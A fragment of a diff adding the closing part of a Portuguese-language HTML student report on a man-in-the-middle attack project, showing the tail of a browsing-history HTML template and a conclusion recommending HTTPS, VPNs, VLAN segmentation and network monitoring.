+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Histórico de Navegação<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+</div></code></pre>
+<hr>
+<h3 id="conclus%C3%A3o">Conclusão</h3>
+<p>O ataque MITM evidencia a fragilidade de redes não protegidas. Este projeto reforça a importância de implementar medidas como:</p>
+<ol>
+<li>Uso de criptografia (HTTPS e VPN).</li>
+<li>Segmentação de rede com VLANs.</li>
+<li>Monitoramento ativo para detectar comportamentos anômalos.</li>
+</ol>
+<p>A execução prática do ataque ampliou o entendimento sobre vulnerabilidades e ferramentas de análise de redes, consolidando os conhecimentos adquiridos ao longo do semestre.</p>
+<hr>
+
+</body>
+</html>
